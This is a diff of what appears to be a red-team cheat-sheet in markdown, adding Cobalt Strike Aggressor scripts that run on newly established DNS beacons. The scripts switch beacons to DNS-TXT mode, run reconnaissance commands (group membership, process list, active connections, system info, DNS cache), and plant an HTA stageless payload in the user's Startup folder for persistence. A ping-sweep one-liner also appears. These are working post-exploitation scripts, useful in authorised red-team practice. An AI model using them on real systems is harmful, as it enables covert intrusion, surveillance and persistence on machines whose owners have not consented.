@@ -90,19 +90,35 @@ $(date +%Y-%m-%d-%H-%M-%S)
 `FOR /L %i in (1,1,255) do @ping -n 1 <prefix>.%i | find "Reply"`
 
 ## Cobalt Strike Aggressor Scripting
-### Automate initial information gathering on new DNS beacon
+### Automate setup for DNS beacon
 ```
 on beacon_initial_empty {
 	bnote($1,"Established: " . formatDate('MM/dd/yyyy HH:mm:ss (z)'));
-	btask($1, "Surveying the target!", "T1082");
-	bshell!($1, "echo Groups && whoami /groups");
-	bshell!($1, "echo Processes && tasklist /v");
-	bshell!($1, "echo Connections && netstat -na | findstr \"EST\"");
-	bshell!($1, "echo System Info && systeminfo");
-	bshell!($1, "echo DNS cache && ipconfig /displaydns");
+	bmode($1, "dns-txt");
+	bcheckin($1);
 }
 ```
-
+### Automate initial information gathering on new DNS beacon
+```
+on beacon_initial {
+	binput($1, "Groups");
+	bshell!($1, "whoami /groups");
+	binput($1, "Processes");
+	bshell!($1, "tasklist /v");
+	binput($1, "Connections");
+	bshell!($1, "netstat -na | findstr \"EST\"");
+	binput($1, "System Info");
+	bshell!($1, "systeminfo");
+	binput($1, "DNS Cache");
+	bshell!($1, "ipconfig /displaydns");
+}
+```
+### Automate simple persistence on new DNS beacon
+```
+on beacon_initial {
+	bcp($1, "3powershell-stageless.hta", "c:\\users\\" . binfo($1, "user") . "\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\startfile.hta");
+}
+```
 # Python virtual environments
 ## Install virtualenv
 `pip install virtualenv`
